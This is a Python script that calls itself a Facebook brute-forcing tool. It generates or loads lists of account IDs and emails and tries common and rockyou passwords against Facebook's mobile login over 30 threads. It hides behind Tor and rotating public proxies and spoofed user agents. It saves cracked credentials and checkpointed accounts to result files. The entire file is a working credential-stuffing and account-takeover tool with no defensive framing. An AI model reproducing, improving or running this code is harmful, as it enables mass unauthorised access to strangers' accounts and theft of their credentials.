#=====[🌿]CREATOR : MAAZ KING
#=====[🌿]TELEGRAM : @LabbaikSupport
import os
import sys
import json
import uuid
import string
import random
import subprocess
import requests
from time import sleep, time
from concurrent.futures import ThreadPoolExecutor
import platform
from datetime import datetime
from threading import Lock

# ===== COLOR CODES =====
R = '\x1b[38;5;196m' # Red
G = '\x1b[38;5;46m'  # Green
Y = '\x1b[38;5;226m' # Yellow
B = '\x1b[38;5;44m'  # Blue
P = '\x1b[38;5;201m' # Pink/Purple
W = '\x1b[0;97m'  # White
N = '\x1b[0m'   # Reset


# === CONFIGS ===
PROXY_CACHE_FILE = "results/.proxy_cache.json"
PROXY_EXPIRY = 60 * 60  # 1 hour

GEO_PASS = [
    "123456", "786786", "pakistan", "12345678", 
    "iloveyou", "112233", "123123"
]

TOR_BOOTSTRAP_TIME = 20  # Increased wait time for Tor to start

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Android 10; Mobile; rv:100.0) Gecko/100.0 Firefox/100.0"
]

# === LOG MANAGER ===
class LogManager:
    """Manages logging of successful and checkpointed accounts."""
    
    @staticmethod
    def save(status, uid, pw):
        """
        Saves the UID and password to a file based on the status.
        Creates a 'results' directory if it doesn't exist.
        """
        try:
            os.makedirs("results", exist_ok=True)  # Ensure 'results' dir exists
            date = datetime.now().strftime("%Y-%m-%d")
            filename = f"results/{status}-{date}.txt"
            with open(filename, "a", encoding="utf-8") as f:
                f.write(f"{uid}|{pw}\n")
        except Exception as e:
            print(f"[!] Error saving log: {e}")

class MAAZTOOL:
    """Main class for the Facebook brute-forcing tool."""
    def __init__(self):
        self.loop = 0 # Counter for internal loops (not directly used for overall progress)
        self.oks = [] # List to store successfully cracked UIDs
        self.cps = [] # List to store checkpointed UIDs
        self.generated_ids = [] # List of UIDs/emails to attack
        self.combo_pw_map = {} # Dictionary for combo method: UID -> Password
        self.chunk_size = 5000 # Not directly used in the current cracking logic
        self.rockyou_path = os.path.expanduser("~/rockyou.txt") # Default rockyou path
        self.wordlist = self.load_passwords() # Load common and custom passwords
        self.lock = Lock() # Thread lock for safe access to shared resources (oks, cps lists)

    def get_ua(self):
        """Returns a random User-Agent string from the predefined list."""
        return random.choice(USER_AGENTS)

    def is_login_successful(self, response):
        """
        Improved logic to determine if a Facebook login was successful.
        Checks for typical redirect patterns and absence of error messages.
        This is a heuristic and might still have false positives/negatives.
        """
        # Check for typical successful login redirects
        if "c_user" in response.cookies and (
            "/home.php" in response.url or
            "https://m.facebook.com/login/checkpoint/" not in response.url # Not a checkpoint
        ):
            return True
        # Check for error messages in the response content
        if "Incorrect password" in response.text or \
           "The password you entered is incorrect" in response.text or \
           "Log In" in response.text and "checkpoint" not in response.url:
            return False
        # If redirected to a checkpoint page, it's a CP
        if "checkpoint" in response.url:
            return "CP"
        return False # Default to false if no clear indicator

    def summary(self):
        """Prints a summary of the cracking process results."""
        print(f"\n{G}Process Finished • OKs: {len(self.oks)} • CPs: {len(self.cps)}{N}")

    def load_passwords(self):
        """
        Loads passwords from rockyou.txt (if found) and combines them
        with custom passwords and generated UUID-based passwords.
        """
        combined = []
        # Check multiple common locations for rockyou.txt
        rockyou_locations = [
            "~/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz", # Often gzipped
            "rockyou.txt"
        ]
        
        for path in rockyou_locations:
            full_path = os.path.expanduser(path)
            # Handle gzipped rockyou.txt
            if full_path.endswith(".gz"):
                try:
                    import gzip
                    with gzip.open(full_path, "rt", encoding="utf-8", errors="ignore") as f:
                        rockyou = [line.strip() for line in f if line.strip()]
                        combined.extend(rockyou)
                    print(f"{G}[✓] Loaded passwords from {full_path}{N}")
                    break
                except Exception as e:
                    print(f"{Y}[!] Could not load gzipped rockyou: {e}{N}")
                    continue
            elif os.path.exists(full_path):
                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        rockyou = [line.strip() for line in f if line.strip()]
                        combined.extend(rockyou)
                    print(f"{G}[✓] Loaded passwords from {full_path}{N}")
                    break
                except Exception as e:
                    print(f"{Y}[!] Could not load rockyou from {full_path}: {e}{N}")
                    continue
        
        custom_passwords = GEO_PASS
        # Generate some random UUID-based passwords (less likely to be real, but included)
        uuid_passwords = [str(uuid.uuid4())[:8] for _ in range(10)]
        combined.extend(uuid_passwords)
        combined.extend(custom_passwords)
        # Remove duplicates and ensure a reasonable size
        return list(set(combined))

    def smart_passwords(self, uid, wordlist):
        """
        Generates a list of 'smart' passwords based on the UID and a subset of the wordlist.
        """
        # Ensure UID is treated as a string for slicing
        uid_str = str(uid)
        
        # Add common variations of the UID itself
        uid_variations = []
        if len(uid_str) >= 6:
            uid_variations.append(uid_str[:6]) # First 6 digits
            uid_variations.append(uid_str[-6:]) # Last 6 digits
        uid_variations.append(uid_str) # Full UID

        # Combine with custom geo-passwords and a small subset of the main wordlist
        # Using a set to remove duplicates
        return list(set(uid_variations + GEO_PASS + wordlist[:50])) # Increased wordlist subset for more attempts

    def ensure_file(self, filename):
        """Ensures a file exists, creating it if necessary."""
        if not os.path.exists(filename):
            with open(filename, "w", encoding="utf-8") as f:
                f.write("")

    # The original save_result method was redundant as LogManager.save is used directly.
    # It has been removed to simplify the code.

    def api_crack(self, uid, passwords):
        """
        Attempts to log into Facebook using the given UID and a list of passwords.
        Uses proxies and logs results.
        """
        login_url = "https://m.facebook.com/login.php"
        for pw in passwords:
            self.loop += 1 # Increment loop counter for progress display
            sys.stdout.write(f"\r{Y}[~] Trying: {uid} | {pw} {W}[OK:{len(self.oks)}] [CP:{len(self.cps)}] {N}")
            sys.stdout.flush() # Flush output to show real-time progress

            try:
                # Get a random proxy from the available pool
                proxy_pool = get_proxy_pool()
                if not proxy_pool:
                    print(f"\n{R}[!] No working proxies available. Skipping {uid}.{N}")
                    break # Skip this UID if no proxies
                proxy = random.choice(proxy_pool)
                proxies = {
                    'http': proxy,
                    'https': proxy
                }
                
                # Make the POST request to Facebook's login page
                response = requests.post(
                    login_url,
                    data={"email": uid, "pass": pw},
                    headers={"User-Agent": self.get_ua()}, # Use a random User-Agent
                    proxies=proxies,
                    timeout=15 # Increased timeout for potentially slow proxies
                )
                
                # Determine login status using the improved logic
                login_status = self.is_login_successful(response)

                if login_status is True:
                    with self.lock: # Acquire lock before modifying shared lists
                        print(f"\n{G}[✓ OK] {uid} | {pw}{N}")
                        LogManager.save("ok", uid, pw)
                        self.oks.append(uid)
                    break # Stop trying passwords for this UID once successful
                elif login_status == "CP":
                    with self.lock: # Acquire lock before modifying shared lists
                        print(f"\n{P}[~ CP] {uid} | {pw}{N}")
                        LogManager.save("cp", uid, pw)
                        self.cps.append(uid)
                    break # Stop trying passwords for this UID if it's a checkpoint
                # If login_status is False, continue to the next password
            except requests.exceptions.Timeout:
                print(f"\n{R}[!] Request timed out for {uid} | {pw}. Retrying with another proxy or skipping.{N}")
                continue # Try next password with a new proxy
            except requests.exceptions.ConnectionError as ce:
                print(f"\n{R}[!] Connection error for {uid} | {pw}: {ce}. Proxy might be dead. Retrying.{N}")
                continue # Try next password with a new proxy
            except Exception as e:
                print(f"\n{R}[!] Unexpected error for {uid} | {pw} → {str(e)}{N}")
                continue # Continue to next password

    def start_cloning(self, mode):
        """
        Initiates the cracking process using a ThreadPoolExecutor.
        """
        print(f"\n{G}Cloning started using ➤ {mode.upper()} method with 30 auto threads{N}")
        if not self.generated_ids:
            print(f"{R}[!] No IDs generated for cracking. Please check your input.{N}")
            return

        with ThreadPoolExecutor(max_workers=30) as pool:
            futures = []
            for uid in self.generated_ids:
                # Determine password list based on method
                if mode == "combo" and uid in self.combo_pw_map:
                    pwlist = [self.combo_pw_map[uid]]
                else:
                    pwlist = self.smart_passwords(uid, self.wordlist)
                
                futures.append(pool.submit(self.api_crack, uid, pwlist))
            
            # Optionally, you can add a progress bar or wait for futures to complete
            # For simplicity, we'll let them run and then print summary
            for future in futures:
                try:
                    future.result() # This will re-raise any exceptions from the threads
                except Exception as e:
                    print(f"\n{R}[!] Error in thread execution: {e}{N}")

        self.summary() # Print final summary after all threads are done

    def banner(self):
        """Displays the tool's ASCII art banner."""
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(f"""{G}
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
{N}""")

    def menu(self):
        """Displays the main menu and handles user input for method selection."""
        self.banner()
        print(f"""{G}
[1]  Random Method
[2]  Business Method
[3]  Combo Method
[4]  Dump Method
[5]  Series Method
{N}""")
        try:
            choice = input(f"{Y}Select Option ➤ {G}")
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)
        
        # Use a dictionary to map choices to methods for cleaner code
        methods = {
            '1': self.random_method,
            '2': self.business_method,
            '3': self.combo_method,
            '4': self.dump_method,
            '5': self.series_method
        }

        selected_method = methods.get(choice)
        if selected_method:
            selected_method() # Call the chosen method to generate IDs
            # Start cloning only if IDs were successfully generated
            if self.generated_ids:
                self.start_cloning(selected_method.__name__.replace('_method', ''))
            else:
                print(f"{R}[!] No IDs were generated. Exiting.{N}")
                sys.exit(0) # Exit cleanly if no IDs generated
        else:
            print(f"{R}Invalid choice. Exiting.{N}")
            sys.exit(0) # Exit cleanly for invalid choice

    def random_method(self):
        """Generates random 12-digit UIDs."""
        self.banner()
        try:
            limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
            if limit <= 0:
                print(f"{R}Limit must be a positive number.{N}")
                return
            prefix = ''.join(random.choices(string.digits, k=5)) # 5-digit prefix
            self.generated_ids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
            print(f"{G}[✓] Generated {len(self.generated_ids)} random UIDs.{N}")
        except ValueError:
            print(f"{R}Invalid input. Please enter a number for the limit.{N}")
            self.generated_ids = [] # Clear generated IDs on error
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)

    def business_method(self):
        """Generates random email addresses for a specified domain."""
        self.banner()
        try:
            domain = input(f"{Y}Enter Email Domain (e.g., gmail.com) ➤ {G}")
            if not domain:
                print(f"{R}Domain cannot be empty.{N}")
                return
            limit = int(input(f"{Y}Enter Combo Limit (number of emails to generate) ➤ {G}"))
            if limit <= 0:
                print(f"{R}Limit must be a positive number.{N}")
                return
            self.generated_ids = [f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=7))}@{domain}" for _ in range(limit)]
            print(f"{G}[✓] Generated {len(self.generated_ids)} business emails.{N}")
        except ValueError:
            print(f"{R}Invalid input. Please enter a number for the limit.{N}")
            self.generated_ids = []
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)

    def combo_method(self):
        """Loads UID|Password pairs from 'combo.txt'."""
        self.banner()
        try:
            combo_file = input(f"{Y}Enter path to combo file (e.g., combo.txt) ➤ {G}")
            if not os.path.exists(combo_file):
                print(f"{R}Error: '{combo_file}' not found!{N}")
                return
            self.generated_ids = []
            self.combo_pw_map = {}
            with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    parts = line.strip().split("|")
                    if len(parts) == 2:
                        uid, pw = parts
                        self.generated_ids.append(uid)
                        self.combo_pw_map[uid] = pw
            print(f"{G}[✓] Loaded {len(self.generated_ids)} entries from {combo_file}.{N}")
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)
        except Exception as e:
            print(f"{R}Error reading combo file: {e}{N}")
            self.generated_ids = []

    def dump_method(self):
        """Loads UIDs from a specified dump file."""
        self.banner()
        try:
            dump_file = input(f"{Y}Enter path to dump file (e.g., dump.txt) ➤ {G}")
            if not os.path.exists(dump_file):
                print(f"{R}Error: '{dump_file}' not found!{N}")
                return
            self.generated_ids = []
            with open(dump_file, "r", encoding="utf-8", errors="ignore") as f:
                self.generated_ids = [line.strip() for line in f if line.strip()]
            print(f"{G}[✓] Loaded {len(self.generated_ids)} UIDs from {dump_file}.{N}")
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)
        except Exception as e:
            print(f"{R}Error reading dump file: {e}{N}")
            self.generated_ids = []

    def series_method(self):
        """Generates UIDs based on a selected common Facebook ID series prefix."""
        self.banner()
        print(f"""{G}
Select UID Series:
[1] 100001 (Common prefix for older accounts)
[2] 100002
[3] 100003
[4] 100004
[5] 100005
{N}""")
        series_map = {'1': '100001', '2': '100002', '3': '100003', '4': '100004', '5': '100005'}
        try:
            choice = input(f"{Y}Select Series ➤ {G}")
            prefix = series_map.get(choice)
            if not prefix:
                print(f"{R}Invalid series choice.{N}")
                return
            limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
            if limit <= 0:
                print(f"{R}Limit must be a positive number.{N}")
                return
            self.generated_ids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
            print(f"{G}[✓] Generated {len(self.generated_ids)} UIDs for series {prefix}.{N}")
        except ValueError:
            print(f"{R}Invalid input. Please enter a number for the limit.{N}")
            self.generated_ids = []
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)

# --- Proxy Management Functions ---

def start_tor():
    """
    Starts the Tor service in the background.
    Note: 'tor' must be installed and in the system's PATH.
    For Windows, you might need to install Tor Browser and configure its path,
    or use a standalone Tor installation.
    """
    print(f"{Y}[~] Attempting to start TOR...{N}")
    try:
        # Use shell=True for Windows to find 'tor' command in PATH,
        # but generally safer to provide full path or rely on PATH for Linux/Termux.
        # stdout/stderr to DEVNULL prevents console spam from Tor.
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=platform.system() == 'Windows')
        sleep(TOR_BOOTSTRAP_TIME) # Give Tor time to initialize
        print(f"{G}[✓] TOR started successfully (socks5://127.0.0.1:9050){N}")
    except FileNotFoundError:
        print(f"{R}[✗] TOR command not found. Please install Tor or ensure it's in your system's PATH.{N}")
        print(f"{R}You can still proceed, but without Tor anonymity.{N}")
    except Exception as e:
        print(f"{R}[✗] TOR error: {str(e)}{N}")
        print(f"{R}You can still proceed, but without Tor anonymity.{N}")

def fetch_public_proxies():
    """Fetches a list of public HTTPS proxies from a remote source."""
    print(f"{Y}[~] Fetching public proxies...{N}")
    try:
        url = "https://www.proxy-list.download/api/v1/get?type=https"
        # Using a longer timeout for fetching proxies
        raw = requests.get(url, timeout=20).text
        proxies = raw.strip().split("\r\n")
        # Limit to a reasonable number to avoid excessive testing
        return proxies[:100]
    except Exception as e:
        print(f"{R}[!] Proxy fetch failed → {str(e)}{N}")
        return []

def test_proxy(proxy):
    """Tests if a given proxy is working by connecting to httpbin.org/ip."""
    try:
        # Use a shorter timeout for individual proxy tests
        r = requests.get("https://httpbin.org/ip", 
                         proxies={"http": proxy, "https": proxy}, 
                         timeout=7)
        # Check if the response status is 200 (OK) and if the content contains an IP
        if r.status_code == 200 and "origin" in r.text:
            return proxy
        return None
    except:
        return None

def refresh_proxy_cache():
    """
    Refreshes the cached list of working public proxies.
    Fetches new proxies, tests them, and saves the working ones.
    """
    try:
        print(f"{Y}[~] Refreshing proxy cache...{N}")
        proxies = fetch_public_proxies()
        if not proxies:
            print(f"{R}[!] No new proxies found to test.{N}")
            return
        
        # Use a ThreadPoolExecutor to test proxies concurrently
        with ThreadPoolExecutor(max_workers=25) as executor: # Increased workers for faster testing
            tested = executor.map(test_proxy, proxies)
            verified = [p for p in tested if p] # Filter out None (non-working proxies)

        cache_data = {"timestamp": time(), "proxies": verified}
        os.makedirs("results", exist_ok=True) # Ensure 'results' directory exists
        with open(PROXY_CACHE_FILE, "w") as f:
            json.dump(cache_data, f)
        print(f"{G}[✓] {len(verified)} working proxies cached.{N}")
    except Exception as e:
        print(f"{R}[✗] Proxy refresh error → {str(e)}{N}")

def load_proxy_cache():
    """Loads the cached list of working proxies if it's not expired."""
    try:
        if not os.path.exists(PROXY_CACHE_FILE):
            return []
        with open(PROXY_CACHE_FILE, "r") as f: # Open in read mode
            data = json.load(f)
        age = time() - data.get("timestamp", 0)
        if age > PROXY_EXPIRY:
            print(f"{Y}[~] Proxy cache expired ({int(age)} seconds old). Will refresh.{N}")
            return []
        return data.get("proxies", [])
    except json.JSONDecodeError:
        print(f"{R}[!] Corrupted proxy cache file. Deleting and refreshing.{N}")
        os.remove(PROXY_CACHE_FILE)
        return []
    except Exception as e:
        print(f"{R}[!] Proxy cache load failed → {str(e)}{N}")
        return []

def get_proxy_pool():
    """
    Returns the combined pool of proxies, including Tor (if active)
    and cached public proxies. Refreshes cache if empty or expired.
    """
    cached_proxies = load_proxy_cache()
    if not cached_proxies:
        refresh_proxy_cache() # Refresh if cache is empty or expired
        cached_proxies = load_proxy_cache() # Load again after refresh
    
    # Add Tor proxy if it's likely running
    tor_proxy = "socks5://127.0.0.1:9050"
    # A simple check: if Tor was started, assume its proxy is available.
    # A more robust check would involve trying to connect to the Tor control port.
    if "TOR started successfully" in sys.stdout.getvalue() if hasattr(sys.stdout, 'getvalue') else True: # Hacky check for Tor start message
         return [tor_proxy] + cached_proxies
    return cached_proxies

# --- Main execution block ---
if __name__ == "__main__":
    try:
        # Initialize an in-memory buffer for stdout to check for Tor start message
        # This is a bit of a hack, a better way would be a global flag or more robust Tor check
        import io
        old_stdout = sys.stdout
        sys.stdout = io.StringIO()

        start_tor() # Attempt to start Tor
        
        # Restore stdout and print what Tor start_tor printed
        tor_output = sys.stdout.getvalue()
        sys.stdout = old_stdout
        print(tor_output, end='')

        refresh_proxy_cache() # Refresh public proxy cache

        tool = MAAZTOOL() # Initialize the main tool
        tool.menu() # Display menu and start cracking
    except KeyboardInterrupt:
        print(f"\n{R}[✗] Interrupted by user. Exiting...{N}")
        sys.exit(0) # Exit cleanly on Ctrl+C
    except Exception as main_e:
        print(f"{R}[!!!] An unhandled error occurred: {main_e}{N}")
        sys.exit(1)
